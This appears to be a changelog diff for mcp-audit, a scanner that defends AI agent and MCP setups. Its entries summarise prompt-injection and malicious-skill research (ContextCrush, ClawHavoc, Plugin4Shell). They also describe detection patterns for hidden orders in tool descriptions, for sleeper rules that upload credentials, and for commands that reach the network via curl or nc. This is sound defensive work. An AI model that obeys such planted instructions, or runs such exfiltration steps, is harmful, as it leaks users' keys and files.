@@ -8,13 +8,927 @@ The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
 
 ## [Unreleased]
 
+---
+
+## [0.25.0] - 2026-10-30
+
 ### Added
 
-- **The published advisory feed is now signed with a real project key — the last piece Amendment 7 gated.** A human (Adam) generated a minisign key pair outside any AI coding tool and backed up the private half encrypted offline; the private half lives only in the `MCP_AUDIT_FEED_SIGNING_KEY` secret, scoped to a `feed-signing` GitHub environment whose deployment-branch-policy restricts it to `main` (confirmed with `gh api`, not just the repository settings UI). `.github/workflows/advisory-feed-publish.yml`'s `build` job (the only job with `environment: feed-signing`) writes the secret to a `chmod 600` file under `$RUNNER_TEMP` — never the checkout `publish`'s later `git add` walks — and passes it explicitly via `--key`, deliberately not through `$MCP_AUDIT_SIGNING_KEY` (the secret's name does not match that CLI env var by design, so there is nothing to collide). `build` then runs `mcp-audit feed verify` against its own signed output before uploading anything, so a bad signature fails the workflow rather than reaching the branch users fetch from. `publish` is unchanged: `contents: write`, no `environment:` declaration, no path to the secret. The public half is committed at `keys/mcp-audit-feed.pub` and bundled into the wheel and PyInstaller binary via a new `[tool.hatch.build.targets.wheel.force-include]` entry, so `mcp-audit feed verify --key-alt minisign` resolves it by default (via `bundled_public_key_path()`) whenever neither `--public-key` nor `$MCP_AUDIT_SIGNING_PUBKEY` is given — an explicit flag or env var still wins, and the default never applies to `cosign` or `--keyless` verification, which pin identity through their own mechanisms. `docs/advisory-feed.md`'s "Key custody and rotation" section, which had described the reversed cosign/well-known-URL plan since 2026-08-20, is rewritten to match; so are the stale "no project key exists yet" lines in `src/mcp_audit/cli/advise.py` and `src/mcp_audit/advisory/sign.py`'s module docstring. See `docs/decisions` (marcus repo) `2026-08-23-feed-signing-and-publishing.md` and `2026-08-23-signing-key-custody-recommendation.md`.
-- **The advisory feed now has a real, fetchable publish destination.** `.github/workflows/advisory-feed-publish.yml` previously uploaded the weekly unsigned feed to a GitHub Actions artifact — reachable only with repository access, gone after 30 days. It now commits to a dedicated orphan `feed` branch, fetchable by anyone at `https://raw.githubusercontent.com/adudley78/mcp-audit/feed/index.json`. The workflow is split into `build` (`contents: read`; writes the candidate feed and diffs it against the currently-published one) and `publish` (`contents: write`; only runs when `build` found a real change, so a republish of identical findings under a new timestamp makes no commit — `scripts/feed_diff.py` ignores the `published`/`modified` fields every build stamps fresh, which a byte-for-byte diff cannot). `snapshot_version` reads the live `feed` branch's `index.json` via `--previous-index` on every run, not a local file, so it stays monotonic across runs. Still unsigned — no `--sign`, no key, no secret; see `docs/advisory-feed.md`. See `humans/decisions/2026-08-23-feed-signing-and-publishing.md` in the `marcus` repo.
+- **`affected --transitive` and `affected --fleet` (STORY-0131).** `affected <ID or range> --live --transitive` also checks each server's dependency tree from deps.dev (the client `scan --check-vulns` already uses): a dependency hit is AFFECTED and reports the path (`wrapper@1.0.0 -> leftpad@1.3.0 (INDIRECT)`) in terminal, JSON and SARIF output; a graph that is missing, 404, oversized or flagged incomplete, and a server with no exact version, are COULDN'T CHECK, never NOT AFFECTED. `--transitive` without `--live` exits 2. `--fleet FILE` (repeatable) answers from `scan --format json` files, one row per machine and server, so one command answers for a whole fleet; unreadable, oversized or hostile files are reported as COULDN'T CHECK rows, never a traceback. No new dependency and no new endpoint. See `docs/affected.md`.
+- **`affected` reads the installed Claude Code, Codex and Gemini CLI versions, without running them (STORY-0132).** For a research record with per-product fixes (Plugin4Shell: Claude Code 2.1.179, Codex 0.146.0), each install found is now AFFECTED (below the fix, with the path the version was read from) or NOT AFFECTED (at or above it) instead of COULDN'T CHECK. Versions come from npm global `package.json` files (`npm_config_prefix`, nvm, Homebrew, `/usr/local`, `%APPDATA%\npm`) and Claude Code's native `~/.local/share/claude/versions/` directory; no subprocess is ever started. Every install is listed because the one first on `PATH` cannot be known without running it. Oversized, malformed or looping files are skipped and named in the notes. No install found: COULDN'T CHECK, as before. HARNESS-001 and the other version-dependent findings are unchanged. See `docs/affected.md`.
+- **ClawHavoc credited and measured against the skill checks (STORY-0133).** Koi Security (now part of Palo Alto Networks) reported 341 malicious ClawHub skills, 335 of which used a "Prerequisites" section to send users to a password-protected ZIP (Windows) or a script pasted from a public paste service into Terminal (macOS), ending in Atomic Stealer. Synthetic fixtures for each published shape are in `tests/fixtures/clawhavoc/`; SKILL-005 already caught the command forms and the bundled reverse shell (with SKILL-008). Two prose-only forms were missed and are now SKILL-005 HIGH: `glot.io` or `rentry.co`/`rentry.org` in the same sentence as an instruction to paste or run it in a terminal, and a "password-protected" archive with its password (or an executable) stated beside it; neither fires in a sentence that advises against it. The demo configs, top-100 data and benign skill fixtures contain no candidate text, so they do not measure precision. A skill that sends `.env` to a webhook is still not detected (GAPS.md). SKILL-005 text now cites the research. See `docs/agent-files.md`.
+- **Research record: ContextCrush (STORY-0134).** Eli Ainhorn of Noma Security showed on 2026-03-05 that Context7's Custom Rules were served verbatim by the Context7 MCP server to every user's agent, so a library owner's text acted as trusted documentation; the proof of concept read `.env` files, posted them to an attacker's GitHub issue and deleted files. Noma reports a server-side fix on 2026-02-23; Upstash's confirmation was not found. No CVE, no client version, and no mcp-audit check tests it, so `mcp-audit affected x_MCPRS-32fc646f6f96` answers COULDN'T CHECK with that statement and says nothing was run. Research records gain a product status, `fixed-server-side`, for a fix made in the vendor's own service (`fixed_in` stays null); an older mcp-audit skips such a record and reports it in its errors. A "third-party content into context" source pair was measured and not added (GAPS.md, `docs/severity-framework.md`).
+- **A tool whose label contradicts its own schema (ANNOT-001, STORY-0136).** MCP tool annotations are hints, not enforcement: "a server can claim `readOnlyHint: true` and delete your files anyway" (MCP blog, 2026-03-16), and actlint found 4 of 31 popular servers whose labels the schema contradicted. ANNOT-001 (LOW) fires on a tool annotated `readOnlyHint: true`, or `destructiveHint: false`, whose input schema has a parameter that runs commands (`command`, `script`, `shell`), runs SQL that writes, deletes or overwrites, or takes content to write beside a path. A bare `path` or `url` never counts. It runs on `scan --connect` and over `mcp-lock.tools.json` (saved tool text) in the working directory, and only ever adds a finding. Measured on the top-100 npm corpus (48 servers, 989 tools, 732 annotated): 6 hits, 5 true by hand label, on 3 servers. That is under the 10 hits the rule needs for MEDIUM, so it ships at LOW. See `docs/annotations.md`.
+
+### Changed
+
+- SC-004 and `vet` now credit Yarden Porat (Cyata) for CVE-2025-68143, CVE-2025-68144 and CVE-2025-68145 in Anthropic's Git MCP server (STORY-0130).
+- **A remote server's host or port move is named (STORY-0135).** arXiv 2609.14119 found 370 of 21,643 registry servers (4.16%) moving their remote endpoint to another host under the same name, which the protocol never surfaces. The three places that already noticed a changed URL now say what moved: `lock --verify` LOCK-001 evidence opens with `remote host changed from a.example to b.example` (or a scheme or port sentence, e.g. `remote scheme changed from https to http on host a.example`); RUGPULL-001 evidence names a host change, not a port or scheme change (the rug-pull state file gains an additive `remote_host` key holding the lowercase hostname only; older state files still work, they just cannot name the old host); `diff` adds a `note` to the changed server (terminal, `--format json` when set, PR comment). Only hostnames and ports are quoted, so URL userinfo and query tokens never reach a finding. Finding IDs and severities are unchanged, and the lock file format is unchanged (v1 and v2 locks verify as before).
+
+---
+
+## [0.24.0] - 2026-10-29
+
+### Added
+
+- **`mcp-audit affected <ID or pkg@range>`: is this advisory in my agent stack? (STORY-0121).** Give it a CVE, GHSA, OSV `MAL-*` or research-record ID, or a package and range (`litellm@==1.107.0`), and it answers for every MCP server it discovers: AFFECTED, NOT AFFECTED, or COULDN'T CHECK, each with the evidence, the version it compared, and where the version came from (the launch command's pin, or a lock's `resolved_version` via `--lock`). A floating `npx -y pkg` with no lock is COULDN'T CHECK, never NOT AFFECTED. Terminal, `--format json` and `--format sarif`; exit `1` if anything is affected, `--fail-on-unknown` to also fail on COULDN'T CHECK. Offline by default; `--live` fetches an advisory that is not bundled from OSV.dev. For the Plugin4Shell record it lists each product (Claude Code, Codex, Copilot, Gemini CLI) and runs PLUGIN-003/004; mcp-audit does not yet read installed harness versions, so those rows read COULDN'T CHECK. See `docs/affected.md`.
+
+- **Research records: credited, machine-readable copies of agent-stack research that has no CVE (STORY-0122).** Plugin4Shell, the plugin pin-replacement attack AIR Security published on 2026-09-17, is the first: which products it affected, where each was fixed (Claude Code 2.1.179, Codex 0.146.0; not Copilot; Gemini CLI is deprecated), and that PLUGIN-003 and PLUGIN-004 test the condition. The record is credited to AIR Security's Or Nevo, Dor Granat and Niv Hoffman. It is data that later commands read offline; no scan output changes yet. See `docs/research-records.md`.
+
+- **`lock --connect --save-tool-text`: see what a tool changed, not only that it did (STORY-0123, #215).** `LOCK-007` and `LOCK-008` used to say "the tool `read` changed". With `--save-tool-text`, `lock --connect` also writes the tool definitions to `mcp-lock.tools.json` beside the lock (`--tool-text-path` puts it elsewhere), and `lock --verify --connect` uses it: `LOCK-007` lists each changed schema or annotation path (`annotations.readOnlyHint: true → false`), `LOCK-008` shows the description as a word diff (`[-old-] {+new+}`), `LOCK-006` shows the new tool's text, and `--format pr-comment` prints before and after for a pull request. The poisoning checks run over the added words only, and a match is named in the evidence (severity does not depend on the file). `mcp-lock.json` is unchanged, and nothing about a verdict depends on the new file: it is trusted for display only after each stored definition hashes to the digest the lock holds, and a file that does not match is reported as out of step with no diff shown. No environment or header values are stored. Without the file, `--verify --connect` prints what it did before plus one line saying how to get the diff. Credentials in tool text are redacted in every display. The terminal view is capped per tool; `--format json` carries the full diff (`tool_diffs`). Suggested by Dheeraj S, @patchmcp and AXIALIS on #215. See `docs/lock.md`.
+
+- **KEV, EPSS and public-PoC on every CVE finding (STORY-0124).** A CVE that CISA lists as exploited in the wild now reads differently from one that is not. Each finding with a CVE carries `kev` (with the date CISA added it), `epss` (FIRST's 30-day exploitation probability and percentile, with its date) and `public_poc` (OSV links an `EVIDENCE` reference; checked only for CVEs in mcp-audit's registries, absent otherwise). `scan` and `check` sort KEV first, then severity, then EPSS; `scan` shows a `[KEV, EPSS 77.0%]` badge, `check` names KEV hits in one line, JSON adds `exploit` per finding and `exploit_data` per scan, SARIF adds `result.properties.exploit`, and `affected CVE-...` and `vet` show the same. Every run prints the data's date. The data is a committed file refreshed with `scripts/sync_exploit_signals.py --write` from CISA, FIRST and OSV; `scan --live` and `affected --live` fetch current values (refused with `--offline`; falls back to the bundled data if a source is down). Sources: [CISA KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog), [FIRST EPSS](https://www.first.org/epss/), [OSV.dev](https://osv.dev). See `docs/exploit-signals.md`.
+
+- **Transport-aware advisories and OpenVEX (STORY-0125).** Some advisories exist only on one transport: the MCP Python SDK's Streamable HTTP bugs and mcp-atlassian's HTTP auth bypass are not there when the server speaks stdio. A registry `known_vulns` record can now carry `affected_transports` (`stdio`, `http`, `sse`), `requires_auth` (only when the advisory states it) and `verified_by` (who checked, against what); a tag without `verified_by` is ignored. A server that is *provably* stdio (a command launch, no URL, no `--transport`/`--port`/`--host`-style argument or `TRANSPORT`/`PORT`/`HOST` environment variable) is reported NOT AFFECTED by an advisory tagged without `stdio`, and `SC-004` stops counting it, saying which CVEs it left out. Anything else keeps the advisory: an untagged advisory, a remote URL, a launch that might pick another transport. Five advisories are tagged today (the SDK's CVE-2025-53365, CVE-2026-52869 and CVE-2026-59951; mcp-atlassian's CVE-2026-77244 and CVE-2026-77248), each read from its OSV.dev record. `mcp-audit affected <ID> --format openvex` and `mcp-audit scan --vex PATH` write [OpenVEX](https://openvex.dev) 0.2.0: `affected` with the fix, `fixed`, `not_affected` with `vulnerable_code_not_in_execute_path`, or `under_investigation`, one statement per package URL (no paths or server names); where servers sharing one package disagree, the most cautious status is written. `scripts/audit_registry.py` rejects an unusable tag and prints the tagged count. See `docs/affected.md`.
+
+- **`affected` says what to rotate and writes the policy entry that shuts the server off (STORY-0126).** For each AFFECTED server, a **Respond** block lists the environment, header and flag *names* it could read (no values), other servers in the same config that share them, which well-known credential files exist on the machine (stat only, never opened), and how many tool definitions were saved for it (`--format json` has the same under `respond`). `--policy-out FILE` writes Claude Code managed-policy JSON (`deniedMcpServers`) with the exact launch of each AFFECTED server, but only when the command cannot hold a secret (the package and launcher or transport words only); otherwise that server gets no entry and a note says so. It never writes a name entry, never overwrites a file, never writes into the managed-settings directory, and enforces nothing. See `docs/affected.md`.
+
+- **`affected <ID> --fix` pins affected servers to the advisory's fixed version (STORY-0127).** A dry-run diff by default; `--apply` writes atomically with a `.bak`, like `mcp-audit fix`. The version comes from the advisory (no network): the lowest fixed version above the one the server runs, checked against the advisory's own rules before anything is written, so re-running `affected` reports NOT AFFECTED. A server is left alone, with the reason printed, when no fix is recorded, versions cannot be ordered, the launch uses `--from`/`--with`, or the config is TOML. See `docs/affected.md`.
+
+- **LiteLLM's MCP gateway is in the registry (STORY-0128).** LiteLLM is an AI gateway that exposes MCP servers to agents, so a config that launches it, or points at one, is part of the agent stack. `affected CVE-2026-59822` (MCP authentication bypass, fixed in 1.84.0; on CISA KEV since 2026-09-02) now answers for `uvx litellm[proxy]==...` launches, and `affected MAL-2026-2144` flags the compromised 1.107.0 release (and 1.82.7, 1.82.8) by exact version. A client pointed at a LiteLLM URL stays COULDN'T CHECK: mcp-audit cannot read the version a remote gateway runs. The entry is not marked `verified`. Registry sync no longer records an advisory that only bounded an old line (`last_affected`, no fix) or a `PYSEC-` copy of a `MAL-` record: stored with no fix, it flags every version, the newest release included. The sync added 30 more LiteLLM advisories and 5 for `mcp`, `mcp-server-kubernetes` and `@modelcontextprotocol/sdk`. Known limit, unchanged: only the highest fix is stored, so a version on a backport branch, or older than an advisory's first affected version, can still read AFFECTED.
+
+- **`scan --bundle` and `affected --bundle`: current data with no network (STORY-0129).** A signed bundle directory (the advisory feed plus the registry, known-malicious list, research records and KEV/EPSS signals, with a signed manifest) can be carried across an air gap and read with `mcp-audit scan --bundle DIR` or `mcp-audit affected <ID> --bundle DIR`. It is verified like `feed verify` (signed, unexpired, not rolled back, digests match) plus the manifest and each data file, or the run stops with exit 2 and every reason; there is no `--allow-expired` and no fallback to the installed data. Each run prints the bundle's date. It cannot be combined with `--registry` or any network flag. `scripts/build_bundle.py` assembles and signs one; publishing bundles from the feed workflow is a held change. See `docs/air-gapped.md`.
+
+- **The weekly signed feed is now also an air-gapped bundle (Q-058, Q-055).** Each publish adds `data/` (registry, known-malicious list, research records, KEV/EPSS) and a `bundle.json` signed with the feed key to the `feed` branch, so `git clone --depth 1 --branch feed https://github.com/adudley78/mcp-audit.git` gives `scan --bundle` and `affected --bundle` a directory they verify with no extra key. KEV and EPSS are fetched fresh for each publish, falling back to the committed copy if a source is down or returns less than it holds. `scripts/build_bundle.py` gains `--in-place`, `--exploit-signals` and `--verify`; `scripts/sync_exploit_signals.py` gains `--out`. The committed KEV/EPSS data is refreshed (2026-10-29), adding the LiteLLM CVEs. See `docs/air-gapped.md`.
+
+- **Top-100 npm re-measure on 0.23.0 (Q-045, STORY-0120).** A fresh enumeration of the 100 most-downloaded MCP servers on npm (79 the same as on 2026-10-22). Installs executed no package code, and each server ran with no network and an empty environment. 61 connected, exposing 1,402 live tools. They raised 46 POISON-* findings, 3.3 per 100 tools (was 41 per 100 on 0.21.0). One is real: a long description that tells the agent to send the user's latest message to the vendor. That makes precision 1 of 46, 0 of 2 at HIGH; on 0.21.0 it was 0 of 661. `bench_poisoning.py precision` now scores this corpus, labels can mark a mixed group (`true_positive_count`), and the 2026-10-22 labels and fragment replay are kept and pinned. See `docs/research/2026-10-29-top100-npm/` and `docs/poisoning.md`.
+
+### Fixed
+
+- **`scan --registry` and `--offline-registry` no longer drop the config-hygiene checks (Q-059).** A registry override built a shorter analyzer list without the config-hygiene analyzer, so CFHYG, HOOK, HARNESS, PERM and SANDBOX findings silently disappeared and the grade improved. It now uses the default list with only the registry swapped. A scan with either flag can report more findings than before; that is the fix.
+
+---
+
+## [0.23.0] - 2026-10-29
+
+### Added
+
+- **A committed MCPHub config that runs commands is reported (TRUST-008; STORY-0119).** MCPHub (the Neovim plugin mcphub.nvim and its mcp-hub server) replaces `${cmd: some command}` anywhere in a server entry with that command's output, and reads a project's `.mcphub/servers.json` by default with no approval step in its documentation. A repository that commits such a file is now TRUST-008 in `scan --project` and in a plain `scan`/`check` from the checkout: HIGH, CRITICAL when the command reaches the network (`curl`, a URL, `nc`, ...). The legacy `"KEY": "$: command"` form in `env` counts too. `${env:NAME}` and `${NAME}` references are silent, so is your own `~/.config/mcphub/servers.json`, and nothing is run. See `docs/agent-execution-surface.md`.
+- **`mcp-audit watch` re-scans when a gateway config changes (STORY-0119).** Editing mcptoon's `config.json` / `config.toml`, 1MCP's `mcp.json`, MCPHub's `servers.json`, or the working directory's `.mcptoon.json` / `.mcptoon.toml` triggers a re-scan; these files were previously ignored because their names are too generic to match by name and mcptoon's is TOML. They are matched by full path.
+- **MEM-005 recognises more sleeper rules (STORY-0119).** A destination of `s3://`, `gs://`, `sftp://`, `scp`/`rsync` to a host, an email address, `git remote add` or `git push` to a URL now counts as the payload; "add" counts as an action ("add a key to authorized_keys"); and a time or place named without if/when ("At night, upload the backups ...", "On weekends, send the credentials to ...") counts as the condition. 0 hits on 129 real project instruction files and on 10,099 skill-repository files before and after.
+
+- **Credential files an AI agent can read without asking (REACH-001..003; STORY-0114).** Claude Code runs `cat`, `head` and `tail` without a permission prompt in every mode, and reads files in your project without asking, so a prompt-injected session can read your SSH keys, `~/.aws/credentials` or a project's `.env` and send them on. `scan` and `check` now list the well-known credential files on your machine that no Claude Code `Read` deny rule, `blockReadsOutsideWorkingDirectories` setting or sandbox deny entry protects (REACH-001, LOW), `.env` files in the current folder with no `Read` deny rule (REACH-003, LOW), and a Claude Code login file other people on the machine can read (REACH-002, MEDIUM). mcp-audit never opens these files: it only checks that they exist and their permissions, and names them as `~/...`. Runs only when Claude Code is installed and only in a plain `scan`/`check`. On a developer machine with Claude Code and unprotected stores, a plain `mcp-audit scan` now exits 1 with one LOW finding; use `--severity-threshold medium` to ignore it (`check`, the GitHub Action and pre-commit thresholds are unaffected). See `docs/secret-reach.md`.
+- **Servers behind an MCP gateway are scanned (STORY-0111).** A gateway such as mcptoon, 1MCP or MCPHub shows your agent one MCP server and starts many others behind it, so a scan used to see only the gateway. mcp-audit now reads each gateway's own config (`~/.mcptoon/config.json` and `config.toml`, `~/.config/1mcp/mcp.json` or `<home>\AppData\Roaming\1mcp\mcp.json`, `~/.config/mcphub/servers.json`, and the project files `.mcptoon.json`, `.mcptoon.toml` and `.mcphub/servers.json`) and checks every server in it like any other, under the client `mcptoon-upstream`, `1mcp-upstream` or `mcphub-upstream`. Toxic flow pairs them with your other servers, `scan --project` reports TRUST-001 for a gateway config committed to a repository, and JSON output redacts the `env` and `headers` values and secret-named keys (such as `oauth.clientSecret`) of these servers. `fix` refuses gateway configs. No new finding IDs; `mcp-audit lock` does not record them, so existing locks keep verifying. Read-only: nothing in a gateway config is run or expanded. See `docs/gateways.md`.
+- **Codex and Gemini CLI MCP servers are scanned (STORY-0110).** mcp-audit now reads Codex's `[mcp_servers.<name>]` tables in `~/.codex/config.toml` (or `$CODEX_HOME/config.toml`) and a project's `.codex/config.toml`, and Gemini CLI's `mcpServers` in `~/.gemini/settings.json` and a project's `.gemini/settings.json`. Their servers go through every per-server check (credentials, transport, supply chain, toxic flow, rules, rug-pull) in `scan` and `check`; `scan --project` reports each repository server as TRUST-001, and `lock` records them. Codex's file is TOML; Gemini CLI's may have comments, read the way Gemini CLI reads it (comments allowed, trailing commas not). The transport follows each tool's own rules (Codex: `command` is stdio, `url` is streamable HTTP; Gemini CLI: `httpUrl` first, then `url` with `type`, then `command`). Paths and keys were confirmed from each vendor's source; see `docs/clients.md`. `diff` reads both files too, and `fix` upgrades a Gemini CLI `httpUrl` like `url`, but refuses a TOML file (it writes JSON only). JSON output now also redacts header values (an authentication header keeps its scheme, `Bearer [REDACTED]`; `${VAR}` references are kept) for every client, and Codex's literal `bearer_token`, the OAuth client secret (`client_secret`, `clientSecret`) and credentials inside an `http_headers_helper` command in `raw`.
+- **TRUST-008 now reports a project `.codex/config.toml` that sets `http_headers_helper` (STORY-0110).** Codex runs that shell command on your machine each time it connects to the MCP server, to print the headers it sends, and a repository may set it. HIGH, CRITICAL when the command reaches the network. The helper, `bearer_token_env_var` and Gemini CLI's `authProviderType` count as authentication for AUTH-001; Gemini CLI `oauth.audiences` and Codex `oauth_resource` count as the audience binding for AUTH-002, and an audience list that is empty or only `*` no longer counts.
+- **`mcp-lock.json` lock_version 2 (STORY-0116): what the config said, what the registry said, and a digest per section.** The four format changes agreed with the `trees` producer on [#88](https://github.com/adudley78/mcp-audit/issues/88) ship together. (1) A launch with no version (`npx -y foo`, `uvx pkg`) is recorded as `spec_as_written: "*"`, which is how npm reads a bare name, instead of `"latest"`; `foo@latest` stays `"latest"`, and resolution is unchanged (the registry's `latest`). (2) Each resolved entry records a `resolution_context`: when it was resolved, what `latest` pointed at and its deprecation notice; `npm_major` and `node_version` are always `null` in mcp-audit's section, because mcp-audit reads the registry directly and runs neither npm nor Node. The context explains why two locks differ; it cannot regenerate one. `lock --verify --resolve` reports a changed context as LOCK-010 (INFO), separately from LOCK-004. (3) A top-level `section_digests` map holds the SHA-256 of each section's canonical encoding; each producer writes its own entries and keeps the others, so a section changed by anyone else is LOCK-011 (HIGH, fails `lock --verify`, `scan` and `check`, not waivable), and a file something reformatted is LOCK-012 (LOW, does not fail). (4) SC-005 now says what it can verify: "`latest` is deprecated on npm", and that npm 10.8.2 and later may install a lower non-deprecated version for a bare or range spec. A lock written by an earlier mcp-audit (version 1) verifies exactly as before; the next `lock` or `lock --accept` rewrites it as version 2 without changing any timestamp or resolved version. A lock declaring a version above 2 is refused (exit 2) rather than half-checked. A string with a lone UTF-16 surrogate (no UTF-8 encoding) in a lock section is reported as unverified instead of crashing `lock --verify`, `scan` or `check`. **Upgrade every place that runs `lock --verify` before committing a version-2 lock:** mcp-audit 0.22 and earlier report the new `section_digests` key as an unverified section (exit 1 unless `--allow-unverified`), never as tampering. The digest field name awaits confirmation with the `trees` producer before release. See `docs/lock.md`.
+- **Instruction files that changed since the last scan (INSTR-001 INFO, INSTR-002 MEDIUM; STORY-0113).** Claude Code loads CLAUDE.md into every conversation and edits it when asked, so a changed instruction file is where a lasting instruction lands, and nothing in mcp-audit watched those files: rug-pull state and `mcp-lock.json` track MCP servers. A plain `scan` or `check` now keeps a SHA-256 of each of your own instruction files (`~/.claude/CLAUDE.md`, skills, rules, commands, subagents, `~/.codex/AGENTS.md`, OpenClaw workspace files) and of those at the top of the folder you scan from (CLAUDE.md, AGENTS.md, `.claude/...`, Copilot instructions), and says when one changed (INSTR-001, INFO; usually your own edit). It is MEDIUM (INSTR-002) when the change brought a MEDIUM-or-higher finding on that file that the last scan didn't have, such as a sleeper rule (MEM-005) or an import from outside the folder (MEM-003). Only hashes, sizes and finding IDs are stored (beside the rug-pull state, owner-only permissions), never the text. Your own memory files get the sleeper and heartbeat checks for this purpose too, so a sleeper rule added to `~/.claude/CLAUDE.md` is MEDIUM. Returning to a version seen before (switching back to a branch) is INFO. A file seen for the first time is recorded silently. The record file is shared by every scan and written atomically under a lock, and a record that can't be read is never overwritten. INSTR-001 is a finding, so a plain `scan` exits 1 when one is reported (like RUGPULL-002); `--severity-threshold high`, the Action and pre-commit default, is unaffected. On 80 real edits from the history of 18 public repositories' CLAUDE.md, AGENTS.md and Copilot files: 80 INFO, no MEDIUM. See `docs/agent-files.md`.
+- **Managed MCP policy report (MANAGED-001..005; STORY-0112).** An organization can control which MCP servers Claude Code loads with files in a system directory (`managed-mcp.json`, and `allowedMcpServers` / `deniedMcpServers` / `allowManagedMcpServersOnly` / `managedMcpServers` in `managed-settings.json` and its drop-ins). `scan` and `check` now read those files and compare them with your servers: MANAGED-001 (INFO) says what the policy is, MANAGED-002 (INFO) names each configured server it keeps from loading and why (Claude Code drops these from `/mcp` without saying policy is the reason), MANAGED-003 (LOW) flags managed settings with no MCP policy at all, MANAGED-004 (MEDIUM for a repository's committed settings, LOW otherwise) flags a settings file that widens an allowlist the organization didn't lock, and MANAGED-005 (LOW) flags an allowlist that admits servers by name, which Anthropic says "is not a security control". `scan --project` checks the repository's servers and settings files too. Every rule follows Anthropic's managed-MCP documentation; MDM profiles, the Windows registry and server-managed settings are not read. See `docs/managed-policy.md`.
+
+- **SC-009 (INFO): a pinned version that can't be compared with the CVE fix, and a registry field to order the ones that can.** When a package switches from calendar versions to semantic versions, the numbers stop saying which release is newer: `@modelcontextprotocol/server-filesystem` 2.0.0 was published in October 2026, after the July 2025 fix `2025.7.1`, but sorts below it. SC-004 used to report HIGH, "pins version 2.0.0, which is below the fix", on the current release of the most-installed reference server. A registry entry can now record `semver_resumed_at`, the first semantic version after the calendar releases (`1.0.0` for server-filesystem, from npm's publish times), so 2.0.0 is correctly past the fix and 0.6.2 is still affected (HIGH). Without that field, a `0.x` pin against a calendar fix stays HIGH as before, and any other pair mcp-audit can't order offline is reported at INFO with the advisories listed and how to check the release dates; if other advisories are still clearly affected, SC-004 stays HIGH for those. See `docs/supply-chain.md`.
+- **Orders that hide (POISON-070..075, STORY-0099).** Six new checks for the orders a malicious skill or tool description gives an AI agent, the family a USENIX Security 2026 study of confirmed-malicious skills quotes: keep something from the user ("do not mention this to the user", POISON-070, HIGH), don't ask for permission (POISON-071, LOW), stop using the ask-the-user tool (POISON-072, MEDIUM), threats ("SEVERE VIOLATION", POISON-073, LOW), run something on startup (POISON-074, LOW), and fetch a URL and follow what it says (POISON-075, LOW). Three are LOW because ordinary project instructions use the same words ("read-only commands do not need confirmation"). They run wherever the existing poisoning checks run: MCP configs, live tools under `--connect`, and skill files (where they report at their own severity, not HIGH). None flags any of MCPTox's 353 real tools. On 45 orders written after the checks were finished they catch 23, and none of 45 ordinary sentences written to look like them; they miss paraphrase (`docs/poisoning.md`). The demo's poisoned calculator now also reports POISON-070.
+- **Hidden text in zero-width characters and variation selectors is decoded (POISON-043/044, MEDIUM; STORY-0099).** A run of invisible zero-width characters read as bits, or of variation selectors read as bytes, that spells readable text is reported, and the text is checked against every poisoning pattern (a match is POISON-041, as for Unicode tag characters). A single variation selector after an emoji is ordinary and not read.
+- **Sleeper rules in instruction files (MEM-005, MEDIUM; STORY-0099).** A sentence in CLAUDE.md, AGENTS.md, `.claude/rules` or an OpenClaw workspace file that waits for a trigger (the user later saying a word, running as root, a hostname, a date, off-hours, nobody watching) and then sends, uploads, runs or deletes something sensitive: a URL, `curl`, credentials, keys, backups, a remote endpoint, or something done "silently". "When deploying to the production server, run make migrate" stays quiet; none of 129 real project instruction files fires. Runs in a plain `scan`/`check` on the working directory's instruction files (not when it is your home folder), in `scan --project` and in the agent-file scans; a file reached twice is reported once.
+- **`scan --connect` reads every field of a tool that `mcp-lock.json` records.** The poisoning checks now read a tool's title, output schema and annotations too, as well as every string in its input schema (parameter descriptions, `enum`, `default`, `examples`).
+- **Evidence is redacted before it is shortened.** Poisoning and agent-file findings cut their evidence to 100–160 characters; a token that crossed the cut used to print its first part. The text is now redacted first, then cut (STORY-0099).
+- **Project settings that pick an Azure Foundry resource are named for you to check (CFHYG-008, INFO).** CFHYG-007 treats `<resource>.services.ai.azure.com` as Microsoft's own host and stays silent on it, which is right for the host but not for the resource: anyone can create a Foundry resource in their own Azure subscription, and Claude Code then sends your Azure credential and the conversation there. When a repository's `.claude/settings.json` or `settings.local.json` sets `ANTHROPIC_FOUNDRY_BASE_URL` on such a host, or `ANTHROPIC_FOUNDRY_RESOURCE`, the scan now names the resource and asks you to confirm it belongs to your organisation. Your own `~/.claude/settings.json` is not reported.
+
+### Changed
+
+- **More credentials are kept out of output, scan files and `mcp-lock.json` (STORY-0118).** mcp-audit already hid secrets passed as flags (`--api-key`) and in URLs. It now also hides: credential headers in an argument (`--header "X-API-Key: v"`, `Cookie:`, `Authorization:` with any scheme), `Password=`/`Pwd=` in a connection string, `curl -u user:pass`, the value after `--password` even when it starts with a dash, secret-named query parameters in URLs (`?token=`, `?api_key=`, `?sig=`), and Base64-looking URL user info. The values of `env` in JSON output, snapshots and the PDF's hash input are now redacted for every client, not only gateway servers (a credential-named variable becomes `[REDACTED-FLAG]`; `${VAR}` references and plain settings such as `NODE_ENV` stay; the fields and keys are unchanged). `mcp-audit diff` prints and exports redacted `command`, `args` and URLs for directory and git-ref inputs too, in the terminal, JSON and pull-request comment formats. If you read `servers[].env` values from scan JSON, they are no longer there for credential-named variables. `managed_policy` now uses the same helpers instead of its own copies.
+- **`mcp-lock.json` no longer stores credentials from a launch line (STORY-0118).** `uvx --from git+https://user:TOKEN@host/…` used to put the token in the committed lock, in `identity.args` and in `package.name`. They are now recorded as `[REDACTED]`. A lock written by an earlier version still verifies (both sides are compared redacted), and `lock --accept` rewrites it without the token. A new LOW finding, LOCK-013, says a locked server's launch carries a credential and that the lock cannot see its value change; `mcp-audit lock` prints a warning too. Move the credential into `env`.
+
+- **COMM-015 no longer fires on `${VAR}`, `${env:VAR}` or an offline `${cmd: ...}` (STORY-0119).** The rule flagged any `$` in a server's args as CRITICAL shell injection, including the placeholders clients and MCPHub document (`${CLAUDE_PLUGIN_ROOT}/scripts/...`, `${env:API_KEY}`). A pure `${NAME}` / `${env:NAME}` reference is an environment reference, not command substitution, and is now silent; a `${cmd: ...}` placeholder fires only when its command reaches the network. `$(...)`, backticks, `$NAME`, `${IFS}`, `;`, `|`, `&&`, `>` and `<` still fire. Measured on 656 JSON configs: one arg stopped matching (a real plugin `.mcp.json`), none that carried an injection shape.
